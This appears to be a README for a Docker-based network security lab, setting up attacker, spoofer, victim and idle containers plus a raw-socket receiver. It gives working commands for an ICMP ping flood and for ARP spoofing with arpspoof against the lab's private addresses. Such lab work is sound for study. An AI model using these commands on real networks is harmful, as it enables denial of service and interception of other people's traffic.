# Authors
Aloysio Winter, Carlo Mantovani, Felipe Elsner

# Notes
This application was developed in Linux, but it should work for different operating systems.
However, the commands within this README were executed primarily within a Linux OS.

# Configuration
The pre-defined IPv4 configuration should work within most locations, but if necessary, the addresses can be changed under the **services** and **network** sections within the docker-compose.yml file, following the already estabilished subnet configuration:
- NW Containers
    - Idle
    - Victim
    - Spoofer
- NW2 Containers
    - Attacker

# Start
```
./run.sh 
```
- OR

```
sudo docker-compose run --build --rm attacker zsh

In a different terminal:

sudo iptables -I DOCKER-ISOLATION-STAGE-2 -o br0 -i br1 -j ACCEPT
sudo iptables -I DOCKER-ISOLATION-STAGE-2 -o br1 -i br0 -j ACCEPT
```
- Lastly, run the socket raw in the local machine, outside the containers:
```
sudo python3 receive.py
```


## Addendum
- Depending on the OS, docker compose might be used as: 
```
docker compose
```
- OR
```
docker-compose
```

# Attack 
## Ping Flooding

- Within the Attacker Container, flood the Victim (172.20.0.3) with ICMP packets:
```
sudo ping -f 172.20.0.3  
```
- This floods the br0 interface with ICMP packets
## ARP Spoofing

Within the Attacker Container:
```
ping 172.20.0.3

```
- Run Victim (172.20.0.3) Container:
```
sudo docker exec -it victim sh
```
- Ping Idle (172.20.0.2) in Victim Container:
```
ping 172.20.0.2
```
- Run Spoofer (172.20.0.4) Container:
```
sudo docker compose run --build --rm spoofer zsh
```
- In Spoofer container:
```
arpspoof -i eth0 -t 172.20.0.3 172.20.0.2
```
- This changes the Arp Cache in Victim (172.20.0.3) so that Idle (172.20.0.2) is associated with the Spoofer's MAC address.

# Clean Containers
```
./down.sh
```
- OR
```
sudo docker-compose down
```


